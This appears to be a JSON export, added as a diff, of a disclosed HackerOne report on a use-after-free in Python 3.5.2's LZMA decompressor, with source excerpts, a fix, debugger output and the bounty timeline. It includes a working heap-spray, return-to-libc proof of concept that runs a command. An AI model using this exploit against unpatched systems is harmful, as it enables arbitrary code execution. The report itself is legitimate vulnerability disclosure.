@@ -1,0 +1,328 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2016-12-04T06:09:28.268Z", 
+    "voters": [
+        "madrobot", 
+        "hussein98d", 
+        "mpz", 
+        "exception", 
+        "satishpk1", 
+        "paulos_", 
+        "japz", 
+        "smit", 
+        "spetr0x", 
+        "martijn", 
+        "and 4 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 172562, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2016-12-05T00:30:49.274Z", 
+    "vulnerability_information": "I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.\n\nhttps://bugs.python.org/issue28275\n\n---\n\nPython 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.\n\nstatic PyObject *\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\n{\n    char input_buffer_in_use;\n    PyObject *result;\n    lzma_stream *lzs = &d->lzs;\n\n    /* Prepend unconsumed input if necessary */\n    if (lzs->next_in != NULL) {\n        [...]\n    }\n    else {\n        lzs->next_in = data;\n        lzs->avail_in = len;\n        input_buffer_in_use = 0;\n    }\n\n    result = decompress_buf(d, max_length);\n    if(result == NULL)\n        return NULL;\n    [...]\n}\n\nWhen the function is first called, lzs->next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs->next_in.\n\nA couple returns later, the allocation pointed to by lzs->next_in (data) is freed:\n\nstatic PyObject *\n_lzma_LZMADecompressor_decompress(Decompressor *self, PyObject *args, PyObject *kwargs)\n{\n    PyObject *return_value = NULL;\n    static char *_keywords[] = {\"data\", \"max_length\", NULL};\n    Py_buffer data = {NULL, NULL};\n    Py_ssize_t max_length = -1;\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"y*|n:decompress\", _keywords,\n        &data, &max_length))\n        goto exit;\n    return_value = _lzma_LZMADecompressor_decompress_impl(self, &data, max_length);\n\nexit:\n    /* Cleanup for data */\n    if (data.obj)\n       PyBuffer_Release(&data);\n\n    return return_value;\n}\n\n\nAt this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs->next_in pointer, and thus memory corruption.\n\nstatic PyObject *\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\n{\n    char input_buffer_in_use;\n    PyObject *result;\n    lzma_stream *lzs = &d->lzs;\n\n    /* Prepend unconsumed input if necessary */\n    if (lzs->next_in != NULL) {\n        size_t avail_now, avail_total;\n        [...]\n        memcpy((void*)(lzs->next_in + lzs->avail_in), data, len);\n        lzs->avail_in += len;\n        input_buffer_in_use = 1;\n    }\n    else {\n        [...]\n    }\n}\n\nThis vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.\n\nimport _lzma\nfrom array import *\n\n# System address when tested: 76064070\nd = _lzma.LZMADecompressor()\nspray = [];\nfor x in range(0, 0x700):\n    meg = bytearray(b'\\x76\\x70\\x40\\x06' * int(0x100000 / 4));        \n    spray.append(meg)\n\ndef foo():    \n    for x in range(0, 2):\n        try:\n            d.decompress(b\"\\x20\\x26\\x20\\x63\\x61\\x6c\\x63\\x00\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\" * int(0x100 / (4*4)))\n        except:\n            pass\nfoo()\nprint(len(spray[0]))\nprint(len(spray))\n\n\nTo fix the issue, it is recommended that lzs->next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.\n\n    result = decompress_buf(d, max_length);\n    if(result == NULL) {\n        lzs->next_in = 0;\n        return NULL;\n    }\n\n\nA repro file is attached as well.\n\nException details:\n\n0:000> r\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\n0:000> k\nChildEBP RetAddr  \n009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n009ef434 5d573383 _lzma_d!decompress+0x130 [c:\\source2\\python-3.5.2\\modules\\_lzmamodule.c @ 997]\n009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\\source2\\python-3.5.2\\modules\\_lzmamodule.c @ 1097]\n009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\\source2\\python-3.5.2\\modules\\clinic\\_lzmamodule.c.h @ 99]\n009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\\source2\\python-3.5.2\\objects\\methodobject.c @ 98]\n009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4705]\n009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n009ef660 55fe2daa python35_d!run_mod+0x3e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n009ef7a0 55d38821 python35_d!run_file+0x13d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n009ef918 1c84178e python_d!wmain+0x11 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n009ef92c 1c8415da python_d!invoke_main+0x1e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n009ef984 1c84146d python_d!__scrt_common_main_seh+0x15a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n009ef98c 1c8417a8 python_d!__scrt_common_main+0xd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 309]\n009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17]\n009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b\n0:000> !heap -p -a edi\n    address 09275fe8 found in\n    _DPH_HEAP_ROOT @ 53a1000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    9182d68:          9275000             2000\n    5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2\n    775be045 ntdll!RtlDebugFreeHeap+0x0000003c\n    7751cc3e ntdll!RtlpFreeHeap+0x00000c3e\n    7751b4c8 ntdll!RtlFreeHeap+0x00000268\n    591067a7 ucrtbased!free_base+0x00000027\n    5910394b ucrtbased!calloc_base+0x00000b5b\n    5910617c ucrtbased!free_dbg+0x0000007c\n    59106750 ucrtbased!free+0x00000010\n    55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 90]\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n    55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 316]\n    55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1618]\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n    55e78724 python35_d!PyObject_Free+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 410]\n    55e02005 python35_d!bytes_dealloc+0x00000015 [c:\\source2\\python-3.5.2\\objects\\bytesobject.c @ 956]\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n    55e922f7 python35_d!tupledealloc+0x000000c7 [c:\\source2\\python-3.5.2\\objects\\tupleobject.c @ 236]\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n    55f651a9 python35_d!call_function+0x000003f9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4707]\n    55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n    55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n    55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n    55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n    55fe67de python35_d!run_mod+0x0000003e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n    55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n    55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n    55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n    55d39e6d python35_d!run_file+0x0000013d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n    55d38821 python35_d!Py_Main+0x00000f01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n    1c841331 python_d!wmain+0x00000011 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n    1c84178e python_d!invoke_main+0x0000001e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n    1c8415da python_d!__scrt_common_main_seh+0x0000015a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n\n \n0:000> !analyze -v -nodb\n*******************************************************************************\n*                                                                             *\n*                        Exception Analysis                                   *\n*                                                                             *\n*******************************************************************************\n\n\nFAULTING_IP: \nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917            mov     dword ptr [edi],edx\n\nEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)\n   ExceptionCode: c0000005 (Access violation)\n  ExceptionFlags: 00000000\nNumberParameters: 2\n   Parameter[0]: 00000001\n   Parameter[1]: 09275fe8\nAttempt to write to address 09275fe8\n\nCONTEXT:  00000000 -- (.cxr 0x0;r)\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\n\nFAULTING_THREAD:  000043fc\n\nDEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE\n\nPROCESS_NAME:  python_d.exe\n\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\n\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\n\nEXCEPTION_PARAMETER1:  00000001\n\nEXCEPTION_PARAMETER2:  09275fe8\n\nWRITE_ADDRESS:  09275fe8 \n\nFOLLOWUP_IP: \nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917            mov     dword ptr [edi],edx\n\nNTGLOBALFLAG:  2000000\n\nAPPLICATION_VERIFIER_FLAGS:  0\n\nAPP:  python_d.exe\n\nANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\n\nPRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE\n\nBUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ\n\nLAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149\n\nSTACK_TEXT:  \n009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9\n009ef434 5d573383 060e9f40 08b44970 0000000a _lzma_d!decompress+0x130\n009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93\n009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79\n009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80\n009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9\n009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d\n009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d\n009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d\n009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21\n009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e\n009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a\n009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec\n009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b\n009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d\n009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01\n009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11\n009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e\n009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!__scrt_common_main_seh+0x15a\n009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!__scrt_common_main+0xd\n009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8\n009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b\n\n\nSTACK_COMMAND:  .cxr 0x0 ; kb\n\nFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\n\nFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\n\nFAULTING_SOURCE_LINE_NUMBER:  658\n\nSYMBOL_STACK_INDEX:  0\n\nSYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9\n\nFOLLOWUP_NAME:  MachineOwner\n\nMODULE_NAME: VCRUNTIME140D\n\nIMAGE_NAME:  VCRUNTIME140D.dll\n\nDEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5\n\nFAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec\n\nBUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9\n\nANALYSIS_SOURCE:  UM\n\nFAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec\n\nFAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}\n\nFollowup: MachineOwner\n---------", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "User"
+    }, 
+    "title": "LZMADecompressor.decompress Use After Free", 
+    "is_member_of_team?": null, 
+    "vote_count": 14, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-01-03T06:09:28.305Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,500", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-29T09:59:27.137Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-29T09:59:27.137Z", 
+            "actor": {
+                "username": "johnleitch", 
+                "url": "/johnleitch", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-python", 
+            "message": "The bug was closed when I submitted this, but has since been re-activated as a similar issue has been identified in the BZ2 module.", 
+            "markdown_message": "<p>The bug was closed when I submitted this, but has since been re-activated as a similar issue has been identified in the BZ2 module.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1223268, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-01T04:32:18.752Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-01T04:32:18.752Z", 
+            "actor": {
+                "username": "johnleitch", 
+                "url": "/johnleitch", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-python", 
+            "message": "The BZ2 module is now fixed and the issue is resolved proper.", 
+            "markdown_message": "<p>The BZ2 module is now fixed and the issue is resolved proper.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1227170, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-11T08:10:42.795Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-11T08:10:42.795Z", 
+            "actor": {
+                "username": "johnleitch", 
+                "url": "/johnleitch", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical", 
+                "old_severity": null
+            }, 
+            "team_handle": "ibb-python", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1241673, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "johnleitch", 
+                "url": "/johnleitch"
+            }, 
+            "created_at": "2016-12-03T19:39:41.959Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T19:39:41.959Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-python", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 1338918, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2016-12-03T19:39:50.214Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T19:39:50.214Z", 
+            "actor": {
+                "url": "/ibb-python", 
+                "profile": {
+                    "name": "Python (IBB)"
+                }, 
+                "ibb": true, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
+                }
+            }, 
+            "team_handle": "ibb-python", 
+            "bounty_amount": "1500.0", 
+            "collaborator": {
+                "username": "johnleitch", 
+                "url": "/johnleitch"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1338919, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-04T06:09:28.288Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-04T06:09:28.288Z", 
+            "actor": {
+                "username": "johnleitch", 
+                "url": "/johnleitch", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-python", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1339462, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-05T00:30:49.314Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-05T00:30:49.314Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-python", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1340402, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-05T00:30:49.371Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-05T00:30:49.371Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-python", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1340403, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "johnleitch", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/johnleitch", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 2, 
+        "name": "Memory Corruption - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -60712608.41103995, 
+    "disclosed_at": "2016-12-05T00:30:49.353Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/172562", 
+    "created_at": "2016-09-28T05:25:11.429Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.</p>\n\n<p><a title=\"https://bugs.python.org/issue28275\" href=\"/redirect?signature=78b99d97d415ccff773ba9c360f1b843dec02ce1&amp;url=https%3A%2F%2Fbugs.python.org%2Fissue28275\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.python.org/issue28275</span><i class=\"icon-external-link\"></i></a></p>\n\n<hr>\n\n<p>Python 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.</p>\n\n<p>static PyObject *<br>\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)<br>\n{<br>\n    char input_buffer_in_use;<br>\n    PyObject *result;<br>\n    lzma_stream *lzs = &amp;d-&gt;lzs;</p>\n<pre class=\"highlight plaintext\"><code>/* Prepend unconsumed input if necessary */\nif (lzs-&gt;next_in != NULL) {\n    [...]\n}\nelse {\n    lzs-&gt;next_in = data;\n    lzs-&gt;avail_in = len;\n    input_buffer_in_use = 0;\n}\n\nresult = decompress_buf(d, max_length);\nif(result == NULL)\n    return NULL;\n[...]\n</code></pre>\n<p>}</p>\n\n<p>When the function is first called, lzs-&gt;next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs-&gt;next_in.</p>\n\n<p>A couple returns later, the allocation pointed to by lzs-&gt;next_in (data) is freed:</p>\n\n<p>static PyObject *<br>\n_lzma_LZMADecompressor_decompress(Decompressor *self, PyObject *args, PyObject *kwargs)<br>\n{<br>\n    PyObject *return_value = NULL;<br>\n    static char *_keywords[] = {&quot;data&quot;, &quot;max_length&quot;, NULL};<br>\n    Py_buffer data = {NULL, NULL};<br>\n    Py_ssize_t max_length = -1;</p>\n<pre class=\"highlight plaintext\"><code>if (!PyArg_ParseTupleAndKeywords(args, kwargs, &quot;y*|n:decompress&quot;, _keywords,\n    &amp;data, &amp;max_length))\n    goto exit;\nreturn_value = _lzma_LZMADecompressor_decompress_impl(self, &amp;data, max_length);\n</code></pre>\n<p>exit:<br>\n    /* Cleanup for data */<br>\n    if (data.obj)<br>\n       PyBuffer_Release(&amp;data);</p>\n<pre class=\"highlight plaintext\"><code>return return_value;\n</code></pre>\n<p>}</p>\n\n<p>At this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs-&gt;next_in pointer, and thus memory corruption.</p>\n\n<p>static PyObject *<br>\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)<br>\n{<br>\n    char input_buffer_in_use;<br>\n    PyObject *result;<br>\n    lzma_stream *lzs = &amp;d-&gt;lzs;</p>\n<pre class=\"highlight plaintext\"><code>/* Prepend unconsumed input if necessary */\nif (lzs-&gt;next_in != NULL) {\n    size_t avail_now, avail_total;\n    [...]\n    memcpy((void*)(lzs-&gt;next_in + lzs-&gt;avail_in), data, len);\n    lzs-&gt;avail_in += len;\n    input_buffer_in_use = 1;\n}\nelse {\n    [...]\n}\n</code></pre>\n<p>}</p>\n\n<p>This vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.</p>\n\n<p>import _lzma<br>\nfrom array import *</p>\n\n<h1 id=\"system-address-when-tested-76064070\">System address when tested: 76064070</h1>\n\n<p>d = _lzma.LZMADecompressor()<br>\nspray = [];<br>\nfor x in range(0, 0x700):<br>\n    meg = 